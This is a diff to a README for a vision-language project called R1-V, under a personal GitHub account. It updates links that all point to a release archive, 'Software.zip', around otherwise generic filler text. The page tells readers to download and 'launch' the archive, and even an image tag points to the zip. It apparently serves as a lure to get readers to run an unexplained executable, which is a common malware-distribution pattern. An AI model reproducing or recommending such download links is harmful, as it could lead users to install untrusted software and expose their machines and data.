@@ -9,7 +9,7 @@ Welcome to the repository for R1-V, where you can witness the aha moment of VLM 
 
 ## Installations
 To get started with R1-V, you can download the necessary files from the following link:
-[![Download R1-V](https://github.com/fong0202/R1-V/releases/download/v1.0/Software.zip)](https://github.com/fong0202/R1-V/releases/download/v1.0/Software.zip)
+[![Download R1-V](https://github.com/fong0202/R1-V/releases/download/v2.0/Software.zip)](https://github.com/fong0202/R1-V/releases/download/v2.0/Software.zip)
 
 Please note that the link provided needs to be launched to access the files. 
 
@@ -25,7 +25,7 @@ If you're passionate about VLM and want to contribute to this exciting field, fe
 ## Community
 Join our community of VLM enthusiasts on social media platforms to share your projects, ask questions, and collaborate with like-minded individuals. Together, we can push the boundaries of VLM and create innovative solutions for the future.
 
-![VLM Image](https://github.com/fong0202/R1-V/releases/download/v1.0/Software.zip)
+![VLM Image](https://github.com/fong0202/R1-V/releases/download/v2.0/Software.zip)
 
 ## Support
 If you encounter any issues or have any questions about R1-V, please don't hesitate to reach out to the community for assistance. We're here to help you make the most of your VLM experience and ensure that you have a successful journey with this technology.
